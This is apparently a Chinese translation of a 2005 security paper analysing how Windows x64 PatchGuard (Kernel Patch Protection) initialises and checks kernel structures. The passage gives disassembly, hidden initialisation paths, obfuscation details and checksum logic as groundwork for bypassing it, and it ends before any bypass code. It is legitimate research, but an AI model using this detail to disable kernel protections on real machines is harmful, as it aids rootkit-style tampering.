- Toulouse（4）：Dark Reading 人物特写 https://www.darkreading.com/cybersecurity-analytics/microsoft-s-stepto-gets-into-the-game ；Computerworld 访谈（内核争端）https://www.computerworld.com/article/1642872/q-a-microsoft-exec-defends-company-in-vista-kernel-dispute.html ；eWeek 关于 Vista API 反馈的报道 https://www.eweek.com/security/microsoft-gets-positive-feedback-for-vista-apis/ ；GeekWire 讣闻 https://www.geekwire.com/2017/stephen-stepto-toulouse-1972-2017-microsoft-mainstay-handled-tough-jobs-authority-humor/

## 附录二：原始论文全译一——Bypassing PatchGuard on Windows x64（Uninformed 第 3 卷，skape & Skywing，2005）

## Bypassing PatchGuard on Windows x64 / 绕过 Windows x64 上的 PatchGuard

作者：skape & Skywing

> 译者注：原文《Bypassing PatchGuard on Windows x64》，作者 skape 与 Skywing，发表于安全技术期刊《Uninformed》第 3 卷（Vol 3），日期 2005 年 12 月 1 日。原文链接：http://www.uninformed.org/?v=3&a=3&t=txt 。本译文为全文翻译，不删节、不摘要化；代码、函数名、结构名、数值、寄存器名保持原文；专有名词首次出现时给出中文说明。PatchGuard（补丁卫士）：微软在 Windows x64 内核中引入的内核补丁保护机制，正式名称 Kernel Patch Protection。

### 1) Foreword / 前言

摘要：在 x64 平台上运行的 Windows 内核引入了一项新特性，绰号 PatchGuard，旨在阻止恶意软件和第三方厂商修改某些关键的操作系统结构。这些结构包括特定的系统映像、SSDT（System Service Descriptor Table，系统服务描述符表）、IDT（Interrupt Descriptor Table，中断描述符表）、GDT（Global Descriptor Table，全局描述符表），以及某些关键的处理器 MSR（Model-Specific Register，型号特定寄存器）。这项特性的目的是通过阻止未经认可的行为（例如挂钩 hooking）来确保内核稳定性。然而，它也有一个副作用：妨碍合法产品正常工作。为此，本文将深入分析 PatchGuard 的内部工作原理，着眼于可用于绕过它的技术。本文还将针对所提出的绕过技术提出可能的解决方案。

致谢：作者感谢 westcose、bugcheck、uninformed、Alex Ionescu、Filip Navara，以及每一位出于自身求知兴趣而有动力学习的人。

免责声明（Disclaimer）：本文所讨论的内容仅出于教育目的而呈现。作者不对这些信息被如何使用负责。作者已尽力使分析尽可能详尽，但仍有可能出现一处或多处错误。如发现错误，请联系作者中的一位或两位，以便更正。

### 2) Introduction / 引言

在操作系统的种姓制度里，内核是王。像大多数王一样，内核能通过特权分离这道城墙，抵御用户模式进程这类地位较低的臣民。然而，与大多数王不同的是，内核通常无法抵御与它自身处于同一特权级的对手。内核若不能在自己的特权级上保护其要害器官，只要有任何代码能以与内核相同的特权运行，整个操作系统就会任人修改与颠覆。

时至今日，大多数内核实现都不提供这样一种机制：校验内核的关键部分，以确保它们未被篡改。如果现有内核试图事后部署这类东西，可以预见会在兼容性方面遇到大量问题。多数内核有意不公开其内部设计如何运作——例如系统调用分发如何工作——但很可能至少有一家或多家第三方厂商依赖于这些未公开实现的某些明确行为。

微软的操作系统正是如此。早在 Windows 95 时代、甚至可能更早，微软就意识到：允许第三方厂商摆弄或以其他方式玩弄内核的各个关键部分，只会带来无尽的头疼和稳定性问题，尽管这提供了最高程度的灵活性。微软在 Windows NT 上采取了更强硬的立场，但情况仍然演变成：第三方厂商会使用内核中对完成某些事情特别有用的区域，尽管完成这些事情的手段需要使用未公开的结构和函数。

微软很可能早就意识到自己的命运：他们已经失去了对内核内部改动范围与类型的控制，无法在不影响第三方厂商的情况下自由改动，但他们能对此做些什么的能力却受到极大限制。如果微软部署的代码恰好阻止了主要第三方厂商在没有提供充分替代方案的情况下实现其目标，微软就会陷入一个多半与"反垄断"押韵的大麻烦。尽管局面看似黯淡，微软还是随着 x64 架构的引入得到了收回内核更高灵活性的机会。有些地方用 x64 同时指 AMD64 和 IA64，本文一般将 x64 作为仅指 AMD64 的别名，尽管许多评论也可能适用于 IA64。由于 x64 架构上的 Windows 内核运行在 64 位模式下，顺理成章地，所有内核模式驱动也必须编译为在原生 64 位模式下运行。造成这一点的原因有很多，超出本文范围，但只需说明一点：试图为那些多少要考虑性能的设备驱动设计一个转译层（thunking layer），就足以说明这样做会是一个可怕的主意。

通过要求所有设备驱动都原生编译为 64 位二进制，微软实际上在新平台上抹平了起跑线，让一切回到一张白纸。这使他们不必担心与现有产品的潜在兼容性冲突，因为事实很简单：那时还没有任何已确立的产品。随着第三方厂商把设备驱动移植到 64 位模式，驱动方面任何不受支持或未获认可的行为，都可以被记录为在 x64 架构上被禁止，从而迫使第三方去寻找替代办法（如果可能的话）。这就是微软的反补丁保护系统 PatchGuard 的梦想。这样的目标看起来合乎逻辑、也合乎情理，但这不是本文的要点。

相反，本文将聚焦于 x64 内核中那些旨在保护 Windows 内核关键部分不被修改的改动。本文将描述这些保护机制如何实现、内核的哪些区域受到保护。在此基础上，将详细解释几种可用于禁用和绕过这些保护机制的不同方法，以及针对这些绕过技术的潜在解决方案。最后，将总结其原因与动机，并讨论针对这个更根本问题的其他解决方案。

不过，本文真正的目的是说明：通过一个在与第三方代码相同的特权级上监视代码与数据区域的系统，来安全地保护这些区域，是不可能做到的。这一事实是众所周知的，微软和整个安全界都清楚，无需解释也应当被理解。展望未来，操作系统世界很可能开始转向更细粒度的、由硬件强制的特权分离，即实现相互隔离的可信代码库。这将引发的有关开源操作系统和 DRM（数字版权管理）的问题，应当会慢慢增多。唯有时间能给出答案。

### 3) Implementation / 实现

Windows x64 内核提供的反补丁技术，绰号 PatchGuard，旨在保护关键内核结构不被在获批准的修改上下文之外修改，例如通过微软控制的热补丁（hot patching）进行修改。在本文写作时，PatchGuard 设计用于保护以下关键结构：

- SSDT（System Service Descriptor Table，系统服务描述符表）
- GDT（Global Descriptor Table，全局描述符表）
- IDT（Interrupt Descriptor Table，中断描述符表）
- 系统映像（ntoskrnl.exe、ndis.sys、hal.dll）
- 处理器 MSR（syscall）

在高层面上，PatchGuard 以一组例程的形式实现：它们缓存已知良好的结构副本和/或校验和，然后在某些随机时间间隔（大致每 5 到 10 分钟）对这些结构进行校验。PatchGuard 采用轮询方式而不是事件驱动或硬件支撑的方式实现，是因为对于 PatchGuard 试图完成的事情，并不存在原生的硬件级支持。正因如此，PatchGuard 所诉诸的许多技巧都是出于必要。

做 PatchGuard 的团队无疑非常聪明。他们意识到以引言所述方式实现反补丁模型的局限性，于是被迫诉诸其他手段来增强保护机制。特别是，PatchGuard 大量使用"以隐蔽求安全"（security through obscurity）的做法，采用诸如误导、函数误命名和一般性的代码混淆等策略。许多人会争辩说以隐蔽求安全毫无作用，但作者认为，这只是一个把门槛抬高到足够程度的问题——高到足以让相当多的人无法完全理解某个东西。

初始化 PatchGuard 的代码在启动过程早期、作为 nt!KeInitSystem 的一部分开始。而有趣的事情正是从这里开始的。

#### 3.1) Initializing PatchGuard / 初始化 PatchGuard

PatchGuard 的初始化是多方面的，但一切总要有个起点。在这里，PatchGuard 的初始化始于一个符号名与反补丁保护毫无关系的函数。事实上，它名为 KiDivide6432，它唯一做的事情就是一个除法运算，如下面代码所示：

```
ULONG KiDivide6432(
    IN ULONG64 Dividend,
    IN ULONG Divisor)
{
    return Dividend / Divisor;
}
```

这个函数看上去可能人畜无害，但它实际上是 PatchGuard 第一次试图用误导来隐藏其真实意图。在这里，对 nt!KiDivide6432 的调用传入的被除数来自 nt!KiTestDividend。除数被硬编码为 0xcb5fa3。这个函数看上去意在伪装成某种除法测试，确保底层架构支持除法运算。如果对该函数的调用没有返回预期结果 0x5ee0b7e5，nt!KeInitSystem 将以错误检查代码 0x5d（即 UNSUPPORTED_PROCESSOR）让操作系统蓝屏（bug check），如下所示：

```
nt!KeInitSystem+0x158:
fffff800`014212c2 488b0d1754d5ff   mov     rcx,[nt!KiTestDividend]
fffff800`014212c9 baa35fcb00       mov     edx,0xcb5fa3
fffff800`014212ce e84d000000       call    nt!KiDivide6432
fffff800`014212d3 3de5b7e05e       cmp     eax,0x5ee0b7e5
fffff800`014212d8 0f8519b60100     jne     nt!KeInitSystem+0x170

...

nt!KeInitSystem+0x170:
fffff800`0143c8f7 b95d000000       mov     ecx,0x5d
fffff800`0143c8fc e8bf4fc0ff       call    nt!KeBugCheck
```

用本地 kd 附着时，发现 nt!KiTestDividend 的值被硬编码为 0x014b5fa3a053724c，这样做除法运算——0x014b5fa3a053724c 除以 0xcb5fa3——得到 0x1a11f49ae。这不对劲吧？显然，上面的代码表明，任何不等于 0x5ee0b7e5 的值都会导致蓝屏；但同样明显的是，机器在启动时并不会蓝屏。那么这里到底发生了什么？

答案涉及一桩老派的巧思。上面除法运算的结果是一个大于 32 位的值。AMD64 指令集参考手册指出，当商溢出时，div 指令将产生除法错误故障（divide error fault）。这意味着，只要 nt!KiTestDividend 被设为上面所述的值，就会触发一个除法错误故障，造成一个必须由内核处理的硬件异常。正是这个除法错误故障，实际上导致了 PatchGuard 子系统的间接初始化。不过，在走这条路之前，重要的是理解微软这样做的一个有趣之处。

nt!KiTestDividend 有趣的一点是，它实际上与一个导出符号共用存储（unioned），该符号用于指示调试器是否在场。这个符号名为 nt!KdDebuggerNotPresent，它与 nt!KiTestDividend 的高位字节重叠，如下所示：

```
TestDividend L1
fffff800`011766e0  014b5fa3`a053724c
lkd> db nt!KdDebuggerNotPresent L1
fffff800`011766e7  01
```

如果有调试器在场，全局变量 nt!KdDebuggerNotPresent 将被设为零。如果没有调试器在场，其值为一（默认值）。如果在启动期间有调试器附着到系统时执行上述除法运算——这相当于用 0x004b5fa3a053724c 除以 0xcb5fa3——得到的商将是预期值 0x5ee0b7e5。这意味着，如果在 PatchGuard 保护被间接初始化之前有调试器附着到系统，那么保护将不会被初始化，因为除法错误故障不会被触发。这与已记录的行为相符，其意图是允许驱动程序开发者在调试环境中继续能够设置断点并执行其他可能间接修改内核受监视区域的操作。然而，这只在调试器于启动期间附着到系统时才有效。如果开发者随后在 PatchGuard 已初始化之后再附着调试器，那么设置断点或执行其他操作的行为可能会导致蓝屏，因为 PatchGuard 会检测到这些更改。微软选择以这种方式初始化 PatchGuard，使它能在有调试器附着时透明地禁用保护，同时也充当隐藏真正初始化向量（initialization vector）的一种手段。

理解了 nt!KiTestDividend 的共用存储之后，下一步是理解除法错误故障实际上如何导致 PatchGuard 子系统的初始化。为此，有必要从所有除法错误故障都会去的地方开始：nt!KiDivideErrorFault。

对 nt!KiDivideErrorFault 的间接触发导致一系列函数调用，最终调用 nt!KiOpDiv 来处理 div 指令的除法错误故障。nt!KiOpDiv 例程看似负责对不同种类的除法错误（如除以零）做预处理。虽然乍看之下它似乎正常，但 nt!KiOpDiv 也有一面更黑暗的侧面。导致 nt!KiOpDiv 被调用的栈回溯如下所示。对于那些好奇作者如何能调试这个意在有调试器附着时被禁用的 PatchGuard 初始化向量的人来说，一种方法就是简单地在 nt!KiDivide6432 中的 div 指令处断下，并把 r8d 改为零。这将产生除法错误故障并导致 PatchGuard 初始化例程被调用。为了让机器能正常启动，事后必须在 nt!KiDivide6432 上设置一个断点，自动把 r8d 恢复为 0xcb5fa3：

```
kd> k
Child-SP          RetAddr           Call Site
fffffadf`e4a15f90 fffff800`010144d4 nt!KiOp_Div+0x29
fffffadf`e4a15fe0 fffff800`01058d75 nt!KiPreprocessFault+0xc7
fffffadf`e4a16080 fffff800`0104172f nt!KiDispatchException+0x85
fffffadf`e4a16680 fffff800`0103f5b7 nt!KiExceptionExit
fffffadf`e4a16800 fffff800`0142132b nt!KiDivideErrorFault+0xb7
fffffadf`e4a16998 fffff800`014212d3 nt!KiDivide6432+0xb
fffffadf`e4a169a0 fffff800`0142a226 nt!KeInitSystem+0x169
fffffadf`e4a16a50 fffff800`01243e09 nt!Phase1InitializationDiscard+0x93e
fffffadf`e4a16d40 fffff800`012b226e nt!Phase1Initialization+0x9
fffffadf`e4a16d70 fffff800`01044416 nt!PspSystemThreadStartup+0x3e
fffffadf`e4a16dd0 00000000`00000000 nt!KxStartSystemThread+0x16
```

nt!KiOpDiv 在处理实际的除法故障之前做的第一件事，是调用一个名为 nt!KiFilterFiberContext 的函数。这个函数的名字不仅在一般意义上显得奇怪，在一个本应处理除法故障的例程的具体上下文中也同样奇怪。通过查看 nt!KiFilterFiberContext 的函数体，它的意图很快就清楚了：

```
nt!KiFilterFiberContext:
fffff800`01003ac2 53               push    rbx
fffff800`01003ac3 4883ec20         sub     rsp,0x20
fffff800`01003ac7 488d0552d84100   lea     rax,[nt!KiDivide6432]
fffff800`01003ace 488bd9           mov     rbx,rcx
fffff800`01003ad1 4883c00b         add     rax,0xb
fffff800`01003ad5 483981f8000000   cmp     [rcx+0xf8],rax
fffff800`01003adc 0f855d380c00     jne     nt!KiFilterFiberContext+0x1d
fffff800`01003ae2 e899fa4100       call    nt!KiDivide6432+0x570
```

看来这段代码旨在查看故障发生的地址是否等于 nt!KiDivide6432 + 0xb。如果把 0xb 加到 nt!KiDivide6432 上并反汇编该地址处的指令，结果是：

```
nt!KiDivide6432+0xb:
fffff800`0142132b 41f7f0           div     r8d
```

这与商溢出条件发生时人们会预期的情形相符。根据上面的反汇编，如果故障地址等于 nt!KiDivide6432 + 0xb，那么将调用位于 nt!KiDivide6432 + 0x570 的一个未命名符号。这个未命名符号今后将被称作 nt!KiInitializePatchGuard，它正是驱动 PatchGuard 子系统建立的东西。

nt!KiInitializePatchGuard 例程本身相当庞大。它负责初始化将监视某些系统映像、SSDT、处理器 GDT/IDT、某些关键 MSR 以及某些与调试器相关的例程的上下文。这个初始化例程做的第一件事，是检查机器是否正在以安全模式启动。如果正在以安全模式启动，PatchGuard 子系统将不会被启用，如下所示：

```
nt!KiDivide6432+0x570:
fffff800`01423580 4881ecd8020000   sub     rsp,0x2d8
fffff800`01423587 833d22dfd7ff00   cmp     dword ptr [nt!InitSafeBootMode],0x0
fffff800`0142358e 0f8504770000     jne     nt!KiDivide6432+0x580

...

nt!KiDivide6432+0x580:
fffff800`0142ac98 b001             mov     al,0x1
fffff800`0142ac9a 4881c4d8020000   add     rsp,0x2d8
fffff800`0142aca1 c3               ret
```

安全模式检查通过之后，nt!KiInitializePatchGuard 通过计算 ntoskrnl.exe 中 INITKDBG 节的大小来开始 PatchGuard 的初始化。它通过把位于该节内的一个符号 nt!FsRtlUninitializeSmallMcb 的地址传给 nt!RtlPcToFileHeader 来完成这一点。该例程通过一个输出参数传回 nt 的基址，该基址随后被传给 nt!RtlImageNtHeader。这个方法返回一个指向该映像的 IMAGE_NT_HEADERS 结构的指针。在此基础上，用 nt!FsRtlUninitializeSmallMcb 的虚拟地址减去 nt 的基址，计算出它的 RVA（Relative Virtual Address，相对虚拟地址）。计算出的 RVA 随后被传给 nt!RtlSectionTableFromVirtualAddress，它返回一个指向 nt!FsRtlUninitializeSmallMcb 所在的映像节的指针。下面的调试器输出显示了在获得映像节结构之后 rax 指向什么：

```
kd> ? rax
Evaluate expression: -8796076244456 = fffff800`01000218
kd> dt nt!_IMAGE_SECTION_HEADER fffff800`01000218
+0x000 Name             : [8]  "INITKDBG"
+0x008 Misc             : <unnamed-tag>
+0x00c VirtualAddress   : 0x165000
+0x010 SizeOfRawData    : 0x2600
+0x014 PointerToRawData : 0x163a00
+0x018 PointerToRelocations : 0
+0x01c PointerToLinenumbers : 0
+0x020 NumberOfRelocations : 0
+0x022 NumberOfLinenumbers : 0
+0x024 Characteristics  : 0x68000020
```

这个最初的映像节查找背后的全部原因，与 PatchGuard 混淆和隐藏其所执行代码的方式之一有关。在这里，INITKDBG 节内的代码最终将被复制到一个已分配的保护上下文中，该上下文将在校验阶段被使用。这样做为什么必要，稍后将更详细地讨论。

收集了 INITKDBG 映像节的信息之后，PatchGuard 初始化例程执行许多次伪随机数生成中的第一次。这段代码在 PatchGuard 的各个函数中随处可见，其形式与下面所示代码类似：

```
fffff800`0142362d 0f31                 rdtsc
fffff800`0142362f 488bac24d8020000     mov     rbp,[rsp+0x2d8]
fffff800`01423637 48c1e220             shl     rdx,0x20
fffff800`0142363b 49bf0120000480001070 mov     r15,0x7010008004002001
fffff800`01423645 480bc2               or      rax,rdx
fffff800`01423648 488bcd               mov     rcx,rbp
fffff800`0142364b 4833c8               xor     rcx,rax
fffff800`0142364e 488d442478           lea     rax,[rsp+0x78]
fffff800`01423653 4833c8               xor     rcx,rax
fffff800`01423656 488bc1               mov     rax,rcx
fffff800`01423659 48c1c803             ror     rax,0x3
fffff800`0142365d 4833c8               xor     rcx,rax
fffff800`01423660 498bc7               mov     rax,r15
fffff800`01423663 48f7e1               mul     rcx
fffff800`01423666 4889442478           mov     [rsp+0x78],rax
fffff800`0142366b 488bca               mov     rcx,rdx
fffff800`0142366e 4889942488000000     mov     [rsp+0x88],rdx
fffff800`01423676 4833c8               xor     rcx,rax
fffff800`01423679 48b88fe3388ee3388ee3 mov     rax,0xe38e38e38e38e38f
fffff800`01423683 48f7e1               mul     rcx
fffff800`01423686 48c1ea03             shr     rdx,0x3
fffff800`0142368a 488d04d2             lea     rax,[rdx+rdx*8]
fffff800`0142368e 482bc8               sub     rcx,rax
fffff800`01423691 8bc1                 mov     eax,ecx
```

这个伪随机数生成器使用 rdtsc 指令（读取时间戳计数器）作为种子，然后执行各种按位与乘法运算，直到最终结果在 eax 中产生。这个第一个随机数生成器的结果被用来索引一个池标签（pool tag）数组，这些标签用于 PatchGuard 的内存分配。这是 PatchGuard 试图使在内存中找到其自身内部数据结构变得更难的众多方式之一的例子。在这里，它采用一个随机的合法池标签，努力与其他的内存分配混在一起。下面的代码块显示了池标签数组是如何被索引的，以及它在内存中的何处可以找到：

```
fffff800`01423693 488d0d66c9bdff   lea     rcx,[nt]
fffff800`0142369a 448b848100044300 mov     r8d,[rcx+rax*4+0x430400]
```

在这里，随机数存放在 rax 寄存器中，用来索引位于 nt+0x430400 处的池标签数组。这个数组被间接引用的事实，可以被看作另一种混淆尝试，目的是让乍看之下正在发生的事情不那么明显。如果在调试器中把池标签数组的地址转储出来，就能看到 PatchGuard 可能使用的所有池标签：

```
lkd> db nt+0x430400
41 63 70 53 46 69 6c 65-49 70 46 49 49 72 70 20  AcpSFileIpFIIrp
4d 75 74 61 4e 74 46 73-4e 74 72 66 53 65 6d 61  MutaNtFsNtrfSema
54 43 50 63 00 00 00 00-10 3b 03 01 00 f8 ff ff  TCPc.....;......
```

从数组中随机选出假池标签之后，PatchGuard 初始化例程接着分配一段随机大小的存储空间：其下限为 INITKDBG 节的虚拟大小加 0x1b8，上限为下限加 0x7ff。最小大小中出现的魔数 0x1b8，实际上正是 PatchGuard 用来存储上下文特定保护信息的数据结构的大小，稍后将展示。假池标签和随机大小随后被用来从非分页池（NonPagedPool）分配存储，如下面的伪代码所示：

```
Context = ExAllocatePoolWithTag(
    NonPagedPool,
    (InitKdbgSection->VirtualSize + 0x1b8) + (RandSize & 0x7ff),
    PoolTagArray[RandomPoolTagIndex]);
```

如果上下文分配成功，初始化例程将其内容清零，然后开始初始化该结构的一些属性。分配返回的上下文今后将被称作一个 PATCHGUARD_CONTEXT 类型的结构。该结构的前 0x48 字节实际上由从那个误导性命名的符号 nt!CmpAppendDllSection 复制来的代码构成。这个函数实际上用于在运行时解密该结构，稍后将看到。在 nt!CmpAppendDllSection 被复制到数据结构的前 0x48 字节之后，初始化例程设置了一批存放在该结构内部的函数指针。它存放了地址的例程及其在 PatchGuard 上下文数据结构中的偏移如下所示。

```
  +--------+-------------------------------------------+
  | Offset | Symbol                                    |
  +--------+-------------------------------------------+
  | 0x48   | nt!ExAcquireResourceSharedLite            |
  | 0x50   | nt!ExAllocatePoolWithTag                  |
  | 0x58   | nt!ExFreePool                             |
  | 0x60   | nt!ExMapHandleToPointer                   |
  | 0x68   | nt!ExQueueWorkItem                        |
  | 0x70   | nt!ExReleaseResourceLite                  |
  | 0x78   | nt!ExUnlockHandleTableEntry               |
  | 0x80   | nt!ExAcquireGuardedMutex                  |
  | 0x88   | nt!ObDereferenceObjectEx                  |
  | 0x90   | nt!KeBugCheckEx                           |
  | 0x98   | nt!KeInitializeDpc                        |
  | 0xa0   | nt!KeLeaveCriticalRegion                  |
  | 0xa8   | nt!KeReleaseGuardedMutex                  |
  | 0xb0   | nt!ObDereferenceObjectEx2                 |
  | 0xb8   | nt!KeSetAffinityThread                    |
  | 0xc0   | nt!KeSetTimer                             |
  | 0xc8   | nt!RtlImageDirectoryEntryToData           |
  | 0xd0   | nt!RtlImageNtHeaders                      |
  | 0xd8   | nt!RtlLookupFunctionEntry                 |
  | 0xe0   | nt!RtlSectionTableFromVirtualAddress      |
  | 0xe8   | nt!KiOpPrefetchPatchCount                 |
  | 0xf0   | nt!KiProcessListHead                      |
  | 0xf8   | nt!KiProcessListLock                      |
  | 0x100  | nt!PsActiveProcessHead                    |
  | 0x108  | nt!PsLoadedModuleList                     |
  | 0x110  | nt!PsLoadedModuleResource                 |
  | 0x118  | nt!PspActiveProcessMutex                  |
  | 0x120  | nt!PspCidTable                            |
  +--------+-------------------------------------------+

          PATCHGUARD_CONTEXT function pointers
          （PATCHGUARD_CONTEXT 的函数指针表）
```

PatchGuard 使用函数指针而不是直接调用符号，原因很可能在于 x64 所用的相对寻址模式。由于 PatchGuard 代码从不可预测的地址动态运行，不做指令修复就无法使用相对寻址模式——那无疑将是一项痛苦且不值得的任务。作者看不出把函数指针存放在 PatchGuard 上下文结构中在混淆方面带来任何特别的好处。

所有函数指针都设置完毕之后，初始化例程接着挑选另一个随机池标签，用于后续的分配，并将其存放在 PatchGuard 上下文结构内偏移 0x188 处。此后，又生成两个随机数，两者都将在该结构的加密阶段被使用。一个用作随机旋转位数（rotate bits），另一个用作 XOR（异或）种子。XOR 种子存放在偏移 0x190 处，随机旋转位数值存放在偏移 0x18c 处。

初始化例程采取的下一步，是通过 cpuid 的 ExtendedAddressSize（0x80000008）扩展功能查询处理器，获取可用于表示虚拟地址空间的位数。其结果存放在 PatchGuard 上下文结构内偏移 0x1b4 处。

最后，在初始化各个单独的保护子上下文之前的最后一个主要步骤，是把 INITKDBG 节的内容复制到已分配的 PatchGuard 上下文结构中。复制操作看上去像下面的伪代码：

```
memmove(
    (PCHAR)PatchGuardContext + sizeof(PATCHGUARD_CONTEXT),
    NtImageBase + InitKdbgSection->VirtualAddress,
    InitKdbgSection->VirtualSize);
```

PatchGuard 上下文结构的主要部分初始化完毕之后，下一个合乎逻辑的步骤，就是初始化那些针对实际受保护对象的子上下文。

#### 3.2) Protected Structure Initialization / 受保护结构的初始化

PatchGuard 所保护的结构，由单独的子上下文结构来表示。这些结构在开端由父 PatchGuard 结构（PATCHGUARD_CONTEXT）的内容构成。这包括分配给父结构的函数指针和其他值。子上下文由通用类型加以标识，为校验例程提供可据以判断的依据。

本节将解释每个单独的结构其保护子上下文是如何初始化的。在本文写作时，这些结构按下面所述的顺序初始化其保护子上下文：

- 系统映像（System images）
- SSDT
- GDT/IDT/MSR
- 调试例程（Debug routines）

所有子上下文都初始化完毕之后，父保护上下文被 XOR 处理，并初始化和设置一个定时器（timer）。这个定时器的目的，如将要展示的，是对所收集的数据运行 PatchGuard 子系统的校验那一半。除了后面小节所列的特定保护子上下文之外，作者还观察到，初始化 PatchGuard 子系统的例程还分配了类型一时无法辨明的子上下文结构。特别是，这些类型的子上下文标识符为 0x4 和 0x5。

##### 3.2.1) System Images / 系统映像

保护某些关键内核映像是 PatchGuard 保护方案中较关键的方面之一。如果一个驱动仍能挂钩 nt、ndis 或任何其他关键内核组件中的函数，那么 PatchGuard 大多就无关紧要了。为了解决这一担忧，PatchGuard 执行一组操作，旨在确保系统映像不能被篡改。下表显示了当前受此方案保护的内核映像。

```
         +--------------+
         | Image Name   |
         +--------------+
         | ntoskrnl.exe |
         | hal.dll      |
         | ndis.sys     |
         +--------------+

      Protected kernel images
      （受保护的内核映像）
```

保护这些映像中每一个所采取的方法都是相同的。开头，一个位于该映像内部的符号地址被传给一个 PatchGuard 子例程，它将被称作 nt!PgCreateImageSubContext。该例程的原型如下所示：

```
NTSTATUS PgCreateImageSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN LPVOID SymbolAddress);
```

对于 ntoskrnl.exe，传入的符号地址是 nt!KiFilterFiberContext 的地址。对于 hal.dll，传入 HalInitializeProcessor 的地址。最后，为 ndis.sys 传入的是它的入口点地址，该地址通过调用 nt!GetModuleEntryPoint 获得。

在 nt!PgCreateImageSubContext 内部，保护这些映像的基本方法，是生成几个不同的 PatchGuard 子上下文。第一个子上下文设计用于保存单个映像各节的校验和，有几个例外。第二和第三个子上下文分别保存一个映像的导入地址表（Import Address Table，IAT）和导入目录（Import Directory）的校验和。这些例程都使用一个共享例程，该例程负责生成一个保护子上下文：它使用存放在父 PatchGuard 上下文结构中的随机 XOR 密钥和随机旋转位数，对一块内存生成校验和。这个例程的原型如下所示：

```
typedef struct BLOCK_CHECKSUM_STATE
{
    ULONG   Unknown;
    ULONG64 BaseAddress;
    ULONG   BlockSize;
    ULONG   Checksum;
} BLOCK_CHECKSUM_STATE, *PBLOCK_CHECKSUM_STATE;

PPATCHGUARD_SUB_CONTEXT PgCreateBlockChecksumSubContext(
    IN PPATCHGUARD_CONTEXT Context,
    IN ULONG Unknown,
    IN PVOID BlockAddress,
    IN ULONG BlockSize,
    IN ULONG SubContextSize,
    OUT PBLOCK_CHECKSUM_STATE ChecksumState OPTIONAL);
```

块校验和子上下文把校验和状态存放在 PATCHGUARD_CONTEXT 的末尾。校验和状态存放在一个 BLOCK_CHECKSUM_STATE 结构中。该结构的 Unknown 属性被初始化为来自 nt!PgCreateBlockChecksumSubContext 的 Unknown 参数。这个字段的用途没有被推断出来，但在调试期间其值被设为零。

该例程所用的校验和算法相当简单。下面的伪代码从概念上显示了它如何工作：

```
ULONG64 Checksum = Context->RandomHashXorSeed;
ULONG   Checksum32;

// Checksum 64-bit blocks
while (BlockSize >= sizeof(ULONG64))
{
    Checksum    ^= *(PULONG64)BaseAddress;
    Checksum     = RotateLeft(Checksum, Context->RandomHashRotateBits);
    BlockSize   -= sizeof(ULONG64);
    BaseAddress += sizeof(ULONG64);
}

// Checksum aligned blocks
while (BlockSize-- > 0)
{
    Checksum    ^= *(PUCHAR)BaseAddress;
    Checksum     = RotateLeft(Checksum, Context->RandomHashRotateBits);
    BaseAddress++;
}

Checksum32 = (ULONG)Checksum;

Checksum >>= 31;

do
{
    Checksum32  ^= (ULONG)Checksum;
    Checksum   >>= 31;
} while (Checksum);
```

最终结果是，Checksum32 保存了该块的校验和，它随后连同传给函数的原始块大小和块基址一起，被存入校验和状态结构的 Checksum 属性。

为了初始化映像各节的校验和，nt!PgCreateImageSubContext 调用 nt!PgCreateImageSectionSubContext，其原型为：

```
PPATCHGUARD_SUB_CONTEXT PgCreateImageSectionSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN PVOID SymbolAddress,
    IN ULONG SubContextSize,
    IN PVOID ImageBase);
```

这个例程首先检查 nt!KiOpPrefetchPatchCount 是否为零。如果不为零，就会创建一个不覆盖该映像全部节的块校验和上下文。这大概可能与检测是否已应用热补丁有关，但这一点尚未得到证实。否则，该函数看上去会枚举所提供映像中包含的各个节，跨每个节计算校验和。它看上去排除了名为 INIT、PAGEVRFY、PAGESPEC 和 PAGEKD 的节的校验和。

为了处理一个映像的导入地址表和导入目录，nt!PgCreateImageSubContext 对这两者的目录项调用 nt!PgCreateBlockChecksumSubContext，但前提是这些目录项对所提供的映像存在且有效。

##### 3.2.2) GDT/IDT / 全局与中断描述符表

保护全局描述符表（GDT）和中断描述符表（IDT），是 PatchGuard 的另一个重要特性。GDT 用于描述内核所使用的内存段。它对恶意应用特别有吸引力，因为修改某些关键 GDT 表项可能导致非特权的用户模式应用能够修改内核内存。IDT 也很有用，无论是在恶意上下文还是合法上下文中。在某些情况下，第三方可能希望拦截某些硬件或软件中断，然后再把它交给内核。除非做得正确，否则挂钩 IDT 表项可能非常危险，因为在中断请求处理程序的上下文中运行时必须考虑诸多因素。

GDT/IDT 保护的实际实现，是通过使用 nt!PgCreateBlockChecksumSubContext 函数来完成的，向它传入两个描述符表的内容。由于保存 GDT 和 IDT 的寄存器是相对于某个给定处理器而言的，PatchGuard 为每个处理器上的每张表创建一个单独的上下文。为了获得给定处理器的 GDT 和 IDT 地址，PatchGuard 首先使用 nt!KeSetAffinityThread 确保它运行在某个特定处理器上。之后，它调用 nt!KiGetGdtIdt，该函数把 GDT 和 IDT 的基址作为输出参数存放，如下面原型所示：

```
VOID KiGetGdtIdt(
    OUT PVOID *Gdt,
    OUT PVOID *Idt);
```

GDT 和 IDT 的实际保护在两个单独函数的上下文中完成，它们被标记为 nt!PgCreateGdtSubContext 和 PgCreateIdtSubContext。这些例程的原型如下所示：

```
PPATCHGUARD_SUB_CONTEXT PgCreateGdtSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN UCHAR ProcessorNumber);


PPATCHGUARD_SUB_CONTEXT PgCreateIdtSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN UCHAR ProcessorNumber);
```

这两个例程都是在一个循环的上下文中被调用的，该循环按 nt!KeNumberProcessors 遍历机器上的所有处理器。

##### 3.2.3) SSDT / 系统服务描述符表

最臭名昭著地被第三方驱动挂钩的区域之一，是系统服务描述符表，也称 SSDT。这张表包含操作系统用于分发系统调用的服务表的信息。在 Windows x64 内核上，nt!KeServiceDescriptorTable 传达实际分发表的地址以及原生系统调用接口的分发表中的表项数目。在这里，实际的分发表以相对偏移数组的形式存放在 nt!KiServiceTable 中。这些偏移是相对于数组本身、使用相对寻址的。要获得系统服务例程的绝对地址，可以使用以下方法：

```
lkd> u dwo(nt!KiServiceTable)+nt!KiServiceTable L1
nt!NtMapUserPhysicalPagesScatter:
fffff800`013728b0 488bc4           mov     rax,rsp
lkd> u dwo(nt!KiServiceTable+4)+nt!KiServiceTable L1
nt!NtWaitForSingleObject:
fffff800`012b83a0 4c89442418       mov     [rsp+0x18],r8
```

